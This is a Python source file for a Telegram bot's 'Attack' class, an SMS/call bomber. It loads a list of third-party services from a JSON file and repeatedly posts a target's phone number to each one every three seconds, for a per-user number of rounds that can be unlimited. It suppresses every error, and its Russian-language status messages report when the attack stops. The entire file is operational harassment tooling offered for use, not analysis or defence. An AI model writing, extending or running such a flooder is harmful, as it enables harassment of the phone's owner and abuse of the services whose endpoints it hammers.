from json import loads, dumps
from aiohttp import ClientSession

from asyncio import sleep

from objects import globals

from aiohttp.client_exceptions import (
    ClientConnectionError, ClientOSError, 
    ClientResponseError
    )

from aiogram.types import Message
from datetime import datetime as dt

from temp.headers import headers

from formats.decode_host import decode_host

from loguru import logger

@logger.catch
class Attack:
    phone:str
    user_id:int

    def __init__(self, phone="", user_id=None):
        """ Initialization

        :param: phone (User phone)
        :type: str
        :param: user_id (User Id)
        :type: int

        """

        self.phone:str = phone 
        self.user_id = user_id
        self.client_session:ClientSession = ClientSession()
        self.process_status = True 
        self.state_cirlces = 0 
        self.user_data = None
    
    async def start(self, message: Message):
        """ Start attack

        :param: message
        :type: Message

        """

        # Get all data sites or services
        self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
        circles_status = self.user_data[0].status

        # Check circles count
        if circles_status == "∞":
            self.state_circles = "∞"

        elif int(circles_status) == 0:
            await globals.bot.delete_message(
                chat_id = message.chat.id, 
                message_id = message.message_id+1
            )

            return await message.answer(
                text="🗑Количество кругов израсходовано!"
            )
        
        else:
            self.state_circles:int = int(circles_status)

        # Load all services
        with open(r"sites/services.json") as services_load:
            services = loads(services_load.read())

        # Run attack process
        while self.process_status:

            if self.state_circles == "∞":pass
            elif self.state_circles == 0:
                # Update count circles (auto stoping)
                await self.user_data[0].update(
                    status=str(self.state_circles), 
                    last_phone=self.phone, 
                    last_date=dt.now()
                    ) 

                return await message.answer(
                    text=f"❌Атака остановлена\n"
                    f"🗑Количество кругов израсходовано!"
                )

            for k,v in services.items():
                    
                if "data" in v.keys():

                    url = v["url"] % decode_host(k)                     # Url
                    _data = (v["data"] % self.phone).replace("'", "\"") # Data(type=data)

                    try:
                        await self.client_session.post(
                            url=url,   data=loads(_data), 
                            timeout=2
                            )
                    except (
                        TimeoutError,  ClientConnectionError, 
                        ClientOSError, RuntimeError, 
                        TypeError,     ClientResponseError
                        ):pass
                    except:pass
                
                elif "json" in v.keys():

                    url = v["url"] % decode_host(k)                     # Url
                    _json = (v["json"] % self.phone).replace("'", "\"") # Data(type=json)

                    try:
                        await self.client_session.post(
                            url=url,   json=loads(_json), 
                            timeout=2
                            )
                    except (TimeoutError,  ClientConnectionError, 
                            ClientOSError, RuntimeError, 
                            TypeError,     ClientResponseError
                            ):pass
                    except:pass

                else:
                    try:
                        url = v["url"] % (decode_host(k), self.phone,) # Url
                        await self.client_session.post(
                            url=url, timeout=2
                            )
                    except (
                        TimeoutError,  ClientConnectionError, 
                        ClientOSError, RuntimeError, 
                        TypeError,     ClientResponseError
                        ):pass
                    except:pass
        
            await sleep(3) # Time-out
            if circles_status == "∞":pass
            else:self.state_circles-=1

    async def stop(self):
        """ Stop attack
        """

        # Update count cirlces (handle stoping)
        await self.user_data[0].update(
            status=str(self.state_circles), 
            last_phone=self.phone, 
            last_date=dt.now()
            )

        self.process_status = False       # Change process status 
        await self.client_session.close() # Stop process attack